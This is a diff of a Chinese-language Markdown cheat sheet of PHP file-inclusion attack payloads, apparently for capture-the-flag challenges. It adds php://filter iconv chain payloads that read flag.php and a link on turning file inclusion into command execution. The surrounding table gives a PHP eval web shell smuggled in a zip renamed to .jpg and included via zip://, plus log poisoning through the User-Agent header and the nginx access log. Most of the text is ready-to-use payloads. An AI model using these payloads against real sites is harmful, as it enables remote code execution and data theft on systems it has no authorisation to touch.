@@ -5,7 +5,8 @@
 | Name                                                   | payload                                                                                                                                         |     |
 | ------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | --- |
 | `?file=index` 或 `?file=index.php` 有可能需要去掉 .php |                                                                                                                                                 |     |
-| PHP_INCLUDE_TO_SHELL_CHAR_DICT                         | 文件包含即命令执行                                                                                                                              |     |
+| `?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php` <br> `?file=php://filter/convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L6.UCS2/resource=flag.php`| UTF-8过滤器 , 可以上面两个联合用
+| PHP_INCLUDE_TO_SHELL_CHAR_DICT                         | 文件包含即命令执行   [原理](https://goodapple.top/archives/968) |     |
 | glob://                                                |                                                                                                                                                 |     |
 | 上传 a.zip 改为 a.jpg                                  | zip://伪协议进行包含 一句话 a.php `<?php @eval($_POST['a'])?>` <br>url: `http://xxx//index.php?url=zip:///app/upload/pic.jpg%23a` 密码为 a      |
 | 日志包含                                               | 1.抓包修改 Agent 访问 2.包含日志 /var/log/nginx/access.log                                                                                      |
